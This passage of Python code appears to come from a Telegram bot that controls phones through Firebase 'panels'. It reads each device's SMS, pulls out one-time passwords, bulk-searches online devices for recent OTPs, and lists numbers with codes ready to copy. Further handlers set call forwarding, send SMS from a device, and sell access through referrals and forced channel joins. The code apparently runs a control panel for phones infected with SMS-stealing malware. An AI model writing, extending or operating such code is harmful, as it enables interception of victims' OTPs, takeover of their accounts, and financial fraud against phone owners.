        _log(f"extra_callbacks error [{data}]: {type(e).__name__}: {e}")
    if data == "close_msg":
        await query.answer()
        try: await query.message.delete()
        except: pass
        return

    if not is_admin:
        ready, reason = await gate_state(ctx.bot, chat_id)
        if not ready:
            await query.answer("🔒 Pehle access requirements complete karein.", show_alert=True)
            return

    if not has_access(chat_id):
        await query.answer("🚫 Access nahi hai!", show_alert=True)
        return

    await query.answer()

    if data in ("home",) or data.startswith("backpg:") or data.startswith("pg:"):
        user_focus.pop(chat_id, None)
        pg = 0
        if data.startswith("backpg:") or data.startswith("pg:"):
            try: pg = int(data.split(":")[1])
            except: pg = 0
        user_page[chat_id] = pg
        devices = await get_all_devices(is_admin)
        await safe_edit(query, device_list_header(devices, pg), reply_markup=device_list_keyboard(devices, pg))
        return

    if data == "panels":
        user_focus.pop(chat_id, None)
        visible_tags = [t for t in DATABASES if is_admin or t not in ADMIN_ONLY_TAGS]
        total_panels = len(visible_tags)
        total_devs = sum(len(GLOBAL_DEVICE_CACHE.get(t, [])) for t in visible_tags)
        grand_online = sum(
            sum(1 for d in GLOBAL_DEVICE_CACHE.get(t, []) if d.status == "online")
            for t in visible_tags
        )
        header = (f"{premium_emoji()} <b>ALL PANELS</b>\n"
                  f"━━━━━━━━━━━━━━━━━━\n"
                  f"📡 Panels: {total_panels}  |  📱 Devices: {total_devs}\n"
                  f"🟢 Online: {grand_online}  🔴 Offline: {total_devs - grand_online}\n"
                  f"━━━━━━━━━━━━━━━━━━\n"
                  f"Panel pe click karo → us panel ke numbers dikhenge:")
        await safe_edit(query, header, reply_markup=panels_list_keyboard(is_admin=is_admin))
        return

    if data == "online":
        devices = await get_all_devices(is_admin)
        await safe_edit(query, "🟢 ONLINE NUMBERS", reply_markup=online_only_keyboard(devices))
        return

    if data.startswith("panel:"):
        safe_tag = data[6:]
        original_tag = find_tag_by_safe(safe_tag)
        if not original_tag:
            await safe_edit(query, "❌ Panel nahi mila.")
            return
        if original_tag in ADMIN_ONLY_TAGS and not is_admin:
            await query.answer("🚫 Aapke paas is panel ka access nahi hai!", show_alert=True)
            return
        devices = await get_panel_devices(original_tag)
        text = panel_numbers_text(original_tag, devices)
        await safe_edit(query, text, reply_markup=panel_numbers_keyboard(original_tag, devices))
        return

    if data.startswith("bulksearch_panel:") and is_admin:
        safe_tag = data[17:]
        original_tag = find_tag_by_safe(safe_tag)
        if not original_tag:
            await safe_edit(query, "❌ Panel nahi mila.")
            return
        devices = await get_panel_devices(original_tag, is_admin=True)
        online_devices = [d for d in devices if d.status == "online" and d.numbers]
        if not online_devices:
            await safe_edit(
                query,
                f"📡 <b>{original_tag}</b>\n\n😴 Is panel mein koi online device nahi hai.",
                reply_markup=InlineKeyboardMarkup([[premium_button("🔙 Back", callback_data="bulksearch_back")]])
            )
            return

        try:
            await query.edit_message_text(
                f"⏳ <b>{original_tag}</b> panel check ho raha hai...\n"
                f"🟢 {len(online_devices)} online devices ke SMS check ho rahe hain...",
                parse_mode="HTML"
            )
        except Exception: pass

        sms_tasks = await asyncio.gather(*(get_device_sms(d, limit=20) for d in online_devices))
        today = datetime.now().date()
        yesterday = today - timedelta(days=1)
        tomorrow  = today + timedelta(days=1)

        matched_numbers = []
        for d, smss in zip(online_devices, sms_tasks):
            has_recent_otp = False
            latest_otp = None
            latest_date = None
            for sms in smss:
                body = sms.get("body") or sms.get("message") or sms.get("text") or ""
                otp = extract_otp(body)
                if otp and otp_in_date_range(sms):
                    has_recent_otp = True
                    latest_otp = otp
                    latest_date = sms_date(sms)
                    break
            if has_recent_otp:
                matched_numbers.append((d, latest_otp, latest_date))

        if not matched_numbers:
            result_text = (
                f"📡 <b>{original_tag}</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🟢 Online check kiye: {len(online_devices)}\n"
                f"📅 Date range: {yesterday} → {tomorrow}\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"❌ Kisi bhi online number pe aaj/kal/parson ka OTP nahi mila."
            )
            kb = InlineKeyboardMarkup([[premium_button("🔙 Back", callback_data="bulksearch_back"),
                                        premium_button("❌ Close", callback_data="close_msg")]])
            await safe_edit(query, result_text, reply_markup=kb)
            return

        lines = [
            f"✅ <b>Bulk Search — {original_tag}</b>",
            f"━━━━━━━━━━━━━━━━━━",
            f"🟢 Online checked: {len(online_devices)}",
            f"🎯 OTP mila (aaj/kal/parson): {len(matched_numbers)}",
            f"📅 Range: {yesterday} / {today} / {tomorrow}",
            f"━━━━━━━━━━━━━━━━━━",
        ]
        num_only_lines = []
        for i, (d, otp, dt) in enumerate(matched_numbers, 1):
            num_str = d.numbers[0] if d.numbers else d.name
            lines.append(f"{i}. 🟢 {num_str}  🔑 {otp}  📅 {dt}")
            num_only_lines.append(num_str)
        lines.append("━━━━━━━━━━━━━━━━━━")
        lines.append("📋 <b>Sirf Numbers (copy karo):</b>")
        lines.append("\n".join(num_only_lines))

        full_text = "\n".join(lines)
        rows = []
        for d, otp, dt in matched_numbers[:20]:
            lbl = f"🟢 {d.numbers[0] if d.numbers else d.name}  🔑 {otp}"
            rows.append([premium_button(lbl, callback_data=f"sel:{d.id}")])
        rows.append([premium_button("🔙 Back", callback_data="bulksearch_back"),
                     premium_button("❌ Close", callback_data="close_msg")])
        if len(full_text) > 4000:
            full_text = full_text[:3990] + "\n..."
        await safe_edit(query, full_text, reply_markup=InlineKeyboardMarkup(rows))
        return

    if data == "bulksearch_back" and is_admin:
        header = (f"{premium_emoji()} <b>BULK SEARCH</b>\n"
                  f"━━━━━━━━━━━━━━━━━━\n"
                  f"Panel select karo — sirf online numbers jinka OTP\n"
                  f"aaj / kal / parson aaya ho, wahi milenge.\n"
                  f"━━━━━━━━━━━━━━━━━━")
        await safe_edit(query, header, reply_markup=bulksearch_panels_keyboard())
        return

    if data.startswith("panelref:"):
        safe_tag = data[9:]
        original_tag = find_tag_by_safe(safe_tag)
        if not original_tag:
            await safe_edit(query, "❌ Panel nahi mila.")
            return
        url = DATABASES.get(original_tag, "")
        if url:
            try:
                fresh = await fetch_db_data(original_tag, url)
            except Exception:
                fresh = None
            # Auto-remove protection: empty/failed refresh purane numbers
            # nahi udayega — purana cache hi dikhta rahega.
            if fresh:
                GLOBAL_DEVICE_CACHE[original_tag] = fresh
            elif original_tag not in GLOBAL_DEVICE_CACHE:
                GLOBAL_DEVICE_CACHE[original_tag] = []
        devices = await get_panel_devices(original_tag)
        text = panel_numbers_text(original_tag, devices)
        await safe_edit(query, text, reply_markup=panel_numbers_keyboard(original_tag, devices))
        return

    if data.startswith("sel:"):
        dev_id = data[4:]
        devices = await get_all_devices(is_admin)
        device = next((d for d in devices if d.id == dev_id), None)
        if not device:
            await query.answer("⚠️ Ye device abhi list me nahi hai — panel refresh karein.", show_alert=True)
            return
        if not is_admin and device.db_tag in ADMIN_ONLY_TAGS:
            await query.answer("🚫 Aapke paas is device ka access nahi hai!", show_alert=True)
            return

        # NOTE: user_focus intentionally NOT set here — stops auto-forward spam on device open
        user_focus.pop(chat_id, None)
        back_page = user_page.get(chat_id, 0)

        latest_otp_line = ""
        try:
            # Seed ALL recent SMS keys so old messages don't retrigger
            recent = await get_device_sms(device, limit=SMS_LIMIT)
            for sms_item in recent:
                sms_key = sms_item.get("_key", "")
                if sms_key:
                    seen_ids.add(seen_key(dev_id, sms_key))

            if recent:
                body = recent[0].get("body") or recent[0].get("message") or recent[0].get("text") or ""
                otp = extract_otp(body)
                if otp:
                    latest_otp_line = f"\n🔑 Latest OTP: <code>{otp}</code>\n{sms_date(recent[0])}"
        except Exception: pass

        text = (f"{premium_emoji()} <b>DEVICE TERMINAL</b>\n━━━━━━━━━━━━━━━━━━\n"
                f"Number: {device_label(device)}\nStatus: {device.status}\n"
                f"Server Node: {device.db_tag}{latest_otp_line}\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🔄 Refresh dabao naya OTP dekhne ke liye.")
        await safe_edit(query, text, reply_markup=device_action_keyboard(dev_id, back_page))
        return

    if data.startswith("msgs:"):
        dev_id = data[5:]
        devices = await get_all_devices(is_admin)
        device = next((d for d in devices if d.id == dev_id), None)
        if not device:
            await query.answer("⚠️ Device nahi mila — panel refresh karein.", show_alert=True)
            return
        if not is_admin and device.db_tag in ADMIN_ONLY_TAGS:
            await query.answer("🚫 Access nahi hai!", show_alert=True); return
        smss = await get_device_sms(device)
        if not smss:
            await safe_edit(query, "📭 No SMS found.",
                            reply_markup=InlineKeyboardMarkup([[premium_button("🔙 Back", callback_data=f"sel:{dev_id}")]]))
            return
        body_parts, otp_buttons = [], []
        for sms in smss:
            block, otp = format_sms_block(sms, device_label(device))
            body_parts.append(block)
            if otp: otp_buttons.append([premium_button(f"📋 Copy OTP: {otp}", callback_data=f"cp:{otp}")])
        otp_buttons.append([premium_button("🔙 Back to Terminal", callback_data=f"sel:{dev_id}")])
        full_text = "\n━━━━━━━━━━━━━━━━━━\n\n".join(body_parts)[:4000]
        await safe_edit(query, full_text, reply_markup=InlineKeyboardMarkup(otp_buttons))
        return

    if data.startswith("info:"):
        dev_id = data[5:]
        devices = await get_all_devices(is_admin)
        device = next((d for d in devices if d.id == dev_id), None)
        if not device:
            await query.answer("⚠️ Device nahi mila — panel refresh karein.", show_alert=True)
            return
        if not is_admin and device.db_tag in ADMIN_ONLY_TAGS:
            await query.answer("🚫 Access nahi hai!", show_alert=True); return
        await query.message.reply_text(
            f"📱 Device Info:\n\n{device.device_info}\n🔋 Battery: {parse_battery(device.battery)}%\n📶 Network: {device.status}"
        )
        return

    if data.startswith("cf:"):
        pending_action[chat_id] = {"action": "execute_cf", "dev_id": data[3:]}
        await query.message.reply_text("📞 Forwarding number type karke send karein (e.g. `+919999911111`)")
        return

    if data.startswith("ss:"):
        pending_action[chat_id] = {"action": "execute_ss", "dev_id": data[3:]}
        await query.message.reply_text("💬 Format me send karein:\n`TARGET_NUMBER:MESSAGE_BODY`")
        return

    if data.startswith("cp:"):
        await query.answer(f"OTP: {data[3:]}", show_alert=True); return

    # ── Keyword search confirm / cancel ─────────────────────────────────
    if data.startswith("kw_confirm:"):
        target_id = int(data[11:])
        if chat_id != target_id:
            await query.answer("Yeh aapka confirm nahi hai!", show_alert=True); return
        keyword = pending_kw_confirm.pop(chat_id, None)
        if not keyword:
            await query.answer("Session expire ho gaya. Dobara keyword daalo.", show_alert=True); return
        await query.answer("✅ Poora search shuru...")
        try: await query.message.delete()
        except: pass
        await _run_full_keyword_search(chat_id, keyword, is_admin, query.message.chat_id, ctx)
        return

    if data.startswith("kw_cancel:"):
        target_id = int(data[10:])
        if chat_id != target_id:
            await query.answer(); return
        pending_kw_confirm.pop(chat_id, None)
        await query.answer("❌ Search cancel ho gaya.", show_alert=True)
        try: await query.message.delete()
        except: pass
        return

    if data == "admin_force_join" and is_admin:
        await safe_edit(query, admin_force_join_text(), reply_markup=admin_force_join_keyboard())
        return

    if data == "admin_fj_toggle" and is_admin:
        FORCE_JOIN_ENABLED = not FORCE_JOIN_ENABLED
        save_data()
        await safe_edit(query, admin_force_join_text(), reply_markup=admin_force_join_keyboard())
        return

    if data == "admin_fj_add" and is_admin:
        pending_action[chat_id] = {"action": "add_force_join_channel"}
        _log(f"PENDING SET chat={chat_id} action=add_force_join_channel dict={pending_action}")
        await query.message.reply_text(
            "📢 <b>Add Force Join Channel</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "Public channel (koi bhi format chalega):\n"
            "<code>@channelusername</code>\n"
            "<code>channelusername</code>\n"
            "<code>https://t.me/channelusername</code>\n\n"
            "Private channel:\n<code>-1001234567890 | https://t.me/+xxxxxxxx</code>\n\n"
            "✨ <b>Multi-Add:</b> Ek saath kitne bhi channels — har line pe ek:\n"
            "<code>@channel1\n@channel2\n@channel3\n@channel4</code>\n\n"
            "Public channel ke liye URL optional hai.\n"
            "Private channel ke liye invite URL zaroori hai.\n"
            "Cancel: /cancel",
            parse_mode="HTML"
        )
        return

    if data == "admin_fj_list" and is_admin:
        await query.answer()
        lines = ["📋 <b>FORCE JOIN CHANNELS</b>", "━━━━━━━━━━━━━━━━━━"]
        if not FORCE_JOIN_CHANNELS:
            lines.append("❌ No channels configured.")
        else:
            for index, channel_data in enumerate(FORCE_JOIN_CHANNELS, start=1):
                channel = html_escape(str(channel_data.get("channel", "") or ""))
                url = str(channel_data.get("url", "") or "")
                lines.append(f"<b>{index}.</b> <code>{channel}</code>")
                lines.append(f"   🔗 <code>{html_escape(url or get_force_join_url(channel_data))}</code>")
        await safe_edit(query, "\n".join(lines), reply_markup=admin_force_join_keyboard())
        return

    if data == "admin_fj_remove" and is_admin:
        if not FORCE_JOIN_CHANNELS:
            await query.answer("No channels configured.", show_alert=True)
            return

        rows = []
        for index, channel_data in enumerate(FORCE_JOIN_CHANNELS):
            channel = str(channel_data.get("channel", "") or "")
            if channel:
                rows.append([premium_button(
                    f"Remove {index + 1}. {channel}",
                    callback_data=f"admin_fj_del:{index}",
                    emoji_id="4956719506027185156",
                    style="danger"
                )])
        rows.append([premium_button(
            "Back",
            callback_data="admin_force_join",
            emoji_id="5372849966689566579",
            style="primary"
        )])
        await safe_edit(
            query,
            "🗑 <b>REMOVE FORCE JOIN CHANNEL</b>\n\nSelect a channel to remove:",
            reply_markup=InlineKeyboardMarkup(rows)
        )
        return

    if data.startswith("admin_fj_del:") and is_admin:
        try:
            index = int(data.split(":", 1)[1])
        except (ValueError, IndexError):
            await query.answer("Invalid channel.", show_alert=True)
            return

        if index < 0 or index >= len(FORCE_JOIN_CHANNELS):
            await query.answer("Channel not found.", show_alert=True)
            return

        removed = FORCE_JOIN_CHANNELS.pop(index)
        save_data()
        await query.answer("Channel removed.", show_alert=True)
        await safe_edit(
            query,
            f"✅ <b>Channel removed</b>\n\nRemoved: <code>{html_escape(str(removed.get('channel', '')))}</code>\n\n" + admin_force_join_text(),
            reply_markup=admin_force_join_keyboard()
        )
        return

    if data == "admin_referral" and is_admin:
        await safe_edit(query, admin_referral_text(), reply_markup=admin_referral_keyboard())
        return

    if data == "admin_ref_toggle" and is_admin:
        REFERRAL_ENABLED = not REFERRAL_ENABLED
        save_data()
        await safe_edit(query, admin_referral_text(), reply_markup=admin_referral_keyboard())
        return

    if data == "admin_ref_required" and is_admin:
        pending_action[chat_id] = {"action": "set_required_referrals"}
        await query.message.reply_text(
            f"👥 Required referrals bhejein. Current: <b>{REQUIRED_REFERRALS}</b>\n"
            "Example: <code>2</code>",
            parse_mode="HTML"
        )
        return

    if data == "admin_ref_stats" and is_admin:
        top = sorted(((uid, referral_count(uid)) for uid in all_users), key=lambda x: x[1], reverse=True)
        lines = ["🎁 <b>REFERRAL STATS</b>", "━━━━━━━━━━━━━━━━━━"]
        total = sum(c for _, c in top)
        lines.append(f"Qualified referrals: <b>{total}</b>")
        for uid, count in top[:20]:
            if count <= 0: continue
            name = html_escape(all_users.get(uid, {}).get("name", "Unknown"))
            lines.append(f"• {name} — <code>{uid}</code> — <b>{count}</b>")
        await safe_edit(query, "\n".join(lines), reply_markup=admin_referral_keyboard())
        return

    if data == "admin_refresh" and is_admin:
        await safe_edit(query, admin_panel_text(), reply_markup=admin_keyboard()); return

    if data == "admin_add_main_db" and is_admin:
        pending_action[chat_id] = {"action": "add_bulk_db"}
        await query.message.reply_text(
            "📝 Format:\n<code>TAG=https://your-url.firebaseio.com</code>\n\nEk sath max 20 URLs daal sakte hain.",
            parse_mode="HTML"
        ); return

    if data == "admin_grant_access" and is_admin:
        pending_action[chat_id] = {"action": "grant_access_pipe"}
        await query.message.reply_text(
            "✅ Jis user ko access dena hai uska <b>User ID</b> ya <b>@username</b> bhejein:\n"
            "(User ID: user jab /start karta hai to bot bata deta hai)",
            parse_mode="HTML"
        ); return

    if data == "admin_revoke_access" and is_admin:
        pending_action[chat_id] = {"action": "revoke_access_pipe"}
        await query.message.reply_text("❌ Jis user ka access hatana hai uska <b>User ID</b> ya <b>@username</b> bhejein:", parse_mode="HTML"); return

    if data == "admin_access_list" and is_admin:
        if not allowed_users:
            text = "🔐 <b>Access List</b>\n\nAbhi koi allowed user nahi hai."
        else:
            lines = ["🔐 <b>Allowed Users:</b>"]
            for uid in list(allowed_users)[:30]:
                udata = all_users.get(uid, {})
                name = udata.get("name", "Unknown")
                uname = udata.get("username", "")
                lines.append(f"• {name} (@{uname}) — <code>{uid}</code>")
            text = "\n".join(lines)
        await query.message.reply_text(text, parse_mode="HTML"); return

    if data == "admin_setadmin_list" and is_admin:
        await safe_edit(query, admin_setadmin_text(), reply_markup=admin_setadmin_keyboard()); return

    if data.startswith("toggleadmin:") and is_admin:
        safe_tag = data[12:]
        original_tag = find_tag_by_safe(safe_tag)
        if not original_tag:
            await query.answer("❌ Panel nahi mila!", show_alert=True); return
        if original_tag in ADMIN_ONLY_TAGS:
            ADMIN_ONLY_TAGS.discard(original_tag)
            await query.answer(f"🔓 '{original_tag}' ab sab ko visible hai!", show_alert=True)
        else:
            ADMIN_ONLY_TAGS.add(original_tag)
            await query.answer(f"🔒 '{original_tag}' ab Admin-Only hai!", show_alert=True)
        save_data()
        await safe_edit(query, admin_setadmin_text(), reply_markup=admin_setadmin_keyboard()); return

    if data == "admin_broadcast" and is_admin:
        pending_action[chat_id] = {"action": "broadcast_msg"}
        await query.message.reply_text(
            f"{premium_emoji()} <b>BROADCAST \u2014 EXACT COPY MODE</b>\n"
            "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
            "Ab jo message bhejna hai wo <b>jaisa hai waisa</b> yahan bhej dein:\n\n"
            "\u2022 Premium emoji \u2014 same rahenge\n"
            "\u2022 Inline buttons \u2014 same rahenge\n"
            "\u2022 Photo / Video / Document \u2014 same jayega\n"
            "\u2022 Rich formatting (bold, italic, code) \u2014 same rahegi\n"
            "\u2022 Message jaise hai <b>EXACT waise</b> jayega \u2014 koi extra step nahi\n\n"
            "<i>Bot us message ki exact copy sabhi users ko bhej dega.</i>\n"
            "Cancel karne ke liye <code>/cancel</code> bhejein.",
            parse_mode="HTML"
        )
        return

    if data == "admin_users" and is_admin:
        total = len(all_users)
        text = f"👥 <b>Total Users:</b> {total}\n\n"
        for count, (uid, udata) in enumerate(list(all_users.items())[:30], 1):
            access_icon = "✅" if has_access(uid) else "🚫"
            text += f"{count}. {access_icon} {udata.get('name','Unknown')} (<code>{uid}</code>)\n"
        await query.message.reply_text(text, parse_mode="HTML"); return

    # ── QUICK ACTIONS (safety net — pending ke bina bhi kaam) ──────────────
    if data.startswith("fjq:") and is_admin:
        channel = data[4:].strip()
        existing = {str(c.get("channel", "")).strip() for c in FORCE_JOIN_CHANNELS if isinstance(c, dict)}
        if channel in existing:
            await query.answer(f"⚠️ {channel} already added hai.", show_alert=True)
            return
        if channel.startswith("-100"):
            await query.answer("Private ID ke liye invite URL chahiye — Force Join panel se add karein.", show_alert=True)
            return
        # Verify karo ki bot is channel ko dekh sakta hai — warna Verify Join
        # kaam nahi karega (warning ke saath add, silent fail nahi).
        warn = ""
        if channel.startswith("@"):
            try:
                await ctx.bot.get_chat(channel)
            except Exception as _ve:
                warn = (f"\n\n⚠️ <i>Bot <code>{html_escape(channel)}</code> tak nahi pahunch paaya "
                        f"(<code>{html_escape(str(_ve))[:80]}</code>). Bot ko channel me admin/member "
                        f"banayein, warna Verify check fail hoga.</i>")
        FORCE_JOIN_CHANNELS.append({"channel": channel, "url": ""})
        save_data()
        await query.answer(f"✅ {channel} added!")
        await safe_edit(
            query,
            f"✅ <b>Force Join channel added</b>\n\n"
            f"Channel: <code>{html_escape(channel)}</code>\n"
            f"URL: <code>{html_escape(get_force_join_url({'channel': channel}))}</code>\n\n"
            f"Total channels: <b>{len(FORCE_JOIN_CHANNELS)}</b>{warn}",
            reply_markup=admin_force_join_keyboard(),
        )
        return

    if data.startswith("gaq:") and is_admin:
        target_id = int(data[4:].strip())
        grant_access(target_id)
        await query.answer(f"✅ Access granted: {target_id}")
        await safe_edit(
            query,
            f"✅ <b>Access Granted</b>\n\nUser: <code>{target_id}</code>",
            reply_markup=admin_keyboard(),
        )
        try:
            await ctx.bot.send_message(
                target_id,
                "✅ <b>Access Granted!</b>\n\nAapko bot use karne ki ijazat mil gayi.\n/start karein.",
                parse_mode="HTML",
            )
        except Exception:
            pass
        return

    # ── CATCH-ALL ────────────────────────────────────────────────────────────
    # Koi bhi button jo upar ke kisi branch se match nahi hua, us par button
    # hamesha ghoomta rehta tha aur bot chup rehta tha ("respond hi nahi karta").
    # Yahan har case me saaf jawab dete hain.
    try:
        if not is_admin and data.startswith(("admin_", "adm_")):
            await query.answer("🚫 Admin only — aap owner nahi hain.", show_alert=True)
        elif data.startswith(("admin_", "adm_")):
            await query.answer("⚠️ Ye option abhi available nahi. /start se panel refresh karein.", show_alert=True)
        else:
            await query.answer()
    except Exception:
        pass
    return

# ═══════════════════════════════════════════════════════
#  FULL KEYWORD SEARCH HELPER (called after user confirms)
# ═══════════════════════════════════════════════════════

async def _run_full_keyword_search(chat_id: int, keyword: str, is_admin: bool, send_to: int, ctx) -> None:
    import io
    esc_kw   = html_escape(keyword)
    wait_msg = await ctx.bot.send_message(
        send_to,
        f"🔎 Poora search chal raha hai — keyword <code>{esc_kw}</code>...\n⏳ Wait karein...",
        parse_mode="HTML"
    )

    devices = await get_all_devices(is_admin)
    devices_with_nums = [d for d in devices if d.numbers]

    kw_sem = asyncio.Semaphore(30)
    async def _fetch(d):
        async with kw_sem:
            return await get_device_sms(d, limit=SMS_LIMIT)

    sms_results = await asyncio.gather(*(_fetch(d) for d in devices_with_nums), return_exceptions=True)

    no_keyword_numbers = []
    no_sms_skipped     = 0
    keyword_matched    = 0

    for d, smss in zip(devices_with_nums, sms_results):
        if isinstance(smss, Exception) or not smss:
            no_sms_skipped += 1
            continue
        keyword_found = False
        for sms in smss:
            body = (sms.get("body") or sms.get("message") or sms.get("text") or "").lower()
            if keyword in body:
                keyword_found = True
                break
        if keyword_found:
            keyword_matched += 1
        else:
            latest_sms   = smss[0]
            body_preview = (latest_sms.get("body") or latest_sms.get("message") or latest_sms.get("text") or "")[:80]
            no_keyword_numbers.append((d, latest_sms, body_preview))

    try: await wait_msg.delete()
    except: pass

    total_checked = len(devices_with_nums)
    found_count   = len(no_keyword_numbers)

    if not no_keyword_numbers:
        await ctx.bot.send_message(
            send_to,
            f"🔎 <b>Keyword Search: <code>{esc_kw}</code></b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📱 Checked: {total_checked}  |  ✅ Keyword mila (skip): {keyword_matched}  |  ⏭ No SMS: {no_sms_skipped}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"✅ Sabhi numbers mein keyword mila — koi result nahi.",
            parse_mode="HTML"
        )
        return

    header = (
        f"🔎 <b>Keyword Search: <code>{esc_kw}</code></b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"📱 Checked: {total_checked}  |  ✅ Skip (matched): {keyword_matched}  |  ⏭ No SMS: {no_sms_skipped}\n"
        f"🎯 Keyword NAHI mila: <b>{found_count}</b> numbers\n"
        f"━━━━━━━━━━━━━━━━━━\n"
    )
    lines = []
    rows  = []
    for i, (d, latest_sms, preview) in enumerate(no_keyword_numbers[:30], 1):
        icon    = "🟢" if d.status == "online" else "🔴"
        num_str = d.numbers[0] if d.numbers else d.name
        dt      = sms_date(latest_sms)
        lines.append(f"{i}. {icon} {html_escape(num_str)}  [{html_escape(d.db_tag)}]  {dt}\n    💬 {html_escape(preview)}...")
        if i <= 15:
            rows.append([premium_button(f"{icon} {num_str}", callback_data=f"sel:{d.id}")])

    full_text = header + "\n".join(lines)
    if len(full_text) > 4000:
        full_text = full_text[:3990] + "\n..."
    rows.append([premium_button("❌ Close", callback_data="close_msg")])
    await ctx.bot.send_message(send_to, full_text, reply_markup=InlineKeyboardMarkup(rows), parse_mode="HTML")

    # .txt file with ALL non-matching numbers
    all_nums = [d.numbers[0] if d.numbers else d.name for d, _, __ in no_keyword_numbers]
    file_content = (
        f"Keyword Search: {keyword}\n"
        f"Checked: {total_checked} | Mila+Skip: {keyword_matched} | No SMS: {no_sms_skipped}\n"
        f"Keyword NAHI mila: {found_count} numbers\n"
        f"{'='*40}\n"
        + "\n".join(all_nums)
    ).encode("utf-8")
    file_obj      = io.BytesIO(file_content)
    file_obj.name = f"keyword_{keyword[:20]}.txt"
    await ctx.bot.send_document(
        send_to,
        document=file_obj,
        filename=file_obj.name,
        caption=f"📄 <code>{esc_kw}</code> — {found_count} numbers (keyword nahi mila)",
        parse_mode="HTML"
    )

# ═══════════════════════════════════════════════════════
#  DOCUMENT HANDLER — .txt file se bulk number search
# ═══════════════════════════════════════════════════════

def parse_bulk_panel_urls(text: str) -> tuple[int, int, int, int, dict]:
    """Parse TAG=URL and URL-only lines for admin panel imports.

    Returns: (added, duplicates, conflicts, invalid, newly_added)
    """
    success_count = 0
    invalid_count = 0
    duplicate_count = 0
    conflict_count = 0

    existing_urls = {
        str(url).strip().rstrip("/").lower()
        for url in DATABASES.values()
        if url
    }
    existing_tags = set(DATABASES.keys())
    newly_added = {}

    def next_auto_tag() -> str:
        index = 1
        while f"TAG{index}" in existing_tags:
            index += 1
        tag = f"TAG{index}"
        existing_tags.add(tag)
        return tag

    for raw_line in text.splitlines():
        line = raw_line.strip()

        if not line or line.startswith("#"):
            continue

        if "=" in line:
            tag, url = line.split("=", 1)
            tag = tag.strip()
            url = url.strip()
            if not tag or not url:
                invalid_count += 1
                continue
        else:
            url = line
            tag = next_auto_tag()

        if not (url.startswith("https://") or url.startswith("http://")):
            invalid_count += 1
            continue

        normalized_url = url.rstrip("/")
        normalized_lower = normalized_url.lower()

        if normalized_lower in existing_urls:
            duplicate_count += 1
            continue

        if tag in DATABASES or tag in newly_added:
            conflict_count += 1
            continue

        DATABASES[tag] = normalized_url
        newly_added[tag] = normalized_url
        existing_urls.add(normalized_lower)
        success_count += 1

    return success_count, duplicate_count, conflict_count, invalid_count, newly_added


async def handle_bulk_panel_import(
    update: Update,
    ctx: ContextTypes.DEFAULT_TYPE,
    text: str,
    source_label: str = "message",
) -> None:
    """Import admin panel URLs from pasted text or a .txt file."""
    chat_id = update.effective_chat.id
    if chat_id not in ADMIN_IDS:
        return

    (success_count, duplicate_count, conflict_count,
     invalid_count, newly_added) = parse_bulk_panel_urls(text)

    save_data()
    pending_action.pop(chat_id, None)

    await update.message.reply_text(
        "✅ <b>PANEL IMPORT COMPLETE</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"📄 Source      : <code>{html_escape(source_label)}</code>\n"
        f"✅ Added       : <code>{success_count}</code>\n"
        f"🔁 Duplicates  : <code>{duplicate_count}</code>\n"
        f"⚠️ Conflicts   : <code>{conflict_count}</code>\n"
        f"❌ Invalid     : <code>{invalid_count}</code>\n"
        f"📡 Total DBs   : <code>{len(DATABASES)}</code>\n"
        "━━━━━━━━━━━━━━━━━━",
        parse_mode="HTML"
    )

    if not newly_added:
        return

    await update.message.reply_text(
        f"🔄 <b>{len(newly_added)}</b> naye panels ka data fetch ho raha hai...",
        parse_mode="HTML"
    )

    # Keep the existing behavior: immediately populate cache for newly-added panels.
    fetch_tasks = {tag: fetch_db_data(tag, url) for tag, url in newly_added.items()}
    results = await asyncio.gather(*fetch_tasks.values(), return_exceptions=True)

    for tag, result in zip(fetch_tasks.keys(), results):
        if isinstance(result, Exception):
            GLOBAL_DEVICE_CACHE[tag] = []
        else:
            GLOBAL_DEVICE_CACHE[tag] = result

    for tag, devices in zip(fetch_tasks.keys(), results):
        if isinstance(devices, Exception) or not devices:
            await update.message.reply_text(
                f"📡 <b>{html_escape(tag)}</b>\n📭 Koi device nahi mila is panel mein.",
                parse_mode="HTML"
            )
            continue

        online = sum(1 for d in devices if d.status == "online")
        num_lines = [
            f"📡 <b>{html_escape(tag)}</b> — {len(devices)} devices, {online} online\n"
            "━━━━━━━━━━━━━━━━━━"
        ]
        num_count = 0

        for i, d in enumerate(
            sorted(devices, key=lambda x: (0 if x.status == "online" else 1)),
            1,
        ):
            icon = "🟢" if d.status == "online" else "🔴"
            batt = f" 🔋{d.battery}%" if d.battery else ""
            if d.numbers:
                nums_str = " | ".join(d.numbers)
                num_lines.append(f"{i}. {icon} {nums_str}{batt}")
                num_count += len(d.numbers)
            else:
                num_lines.append(f"{i}. {icon} ⚙️ {d.name[:20]}{batt}")

        num_lines.append(f"━━━━━━━━━━━━━━━━━━\n📲 Total Numbers: {num_count}")
        msg_text = "\n".join(num_lines)

        if len(msg_text) > 4000:
            await update.message.reply_text(msg_text[:4000], parse_mode="HTML")
        else:
            await update.message.reply_text(msg_text, parse_mode="HTML")


async def on_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    is_admin = maybe_promote_admin(update.effective_user) or (chat_id in ADMIN_IDS)
    if all_users.get(chat_id, {}).get("banned"): return
    if not is_admin:
        ready, reason = await gate_state(ctx.bot, chat_id)
        if not ready:
            await send_gate_message(update, ctx, reason)
            return
    if not has_access(chat_id):
        await update.message.reply_text(NO_ACCESS_TEXT, parse_mode="HTML"); return

    doc = update.message.document
    if not doc: return

    fname = doc.file_name or ""
    mime  = doc.mime_type or ""

    # ── ADMIN: Direct .txt panel import ─────────────────────────────
    # Supported formats:
    #   TAG1=https://example-default-rtdb.firebaseio.com
    #   TAG2=https://example2-default-rtdb.firebaseio.com
    # OR URL-only, where TAG1/TAG2/... are generated automatically.
    if is_admin and pending_action.get(chat_id, {}).get("action") == "add_bulk_db":
        if not (fname.lower().endswith(".txt") or "text" in mime.lower()):
            await update.message.reply_text(
                "⚠️ Panel import ke liye sirf <b>.txt</b> file upload karein.",
                parse_mode="HTML"
            )
            return

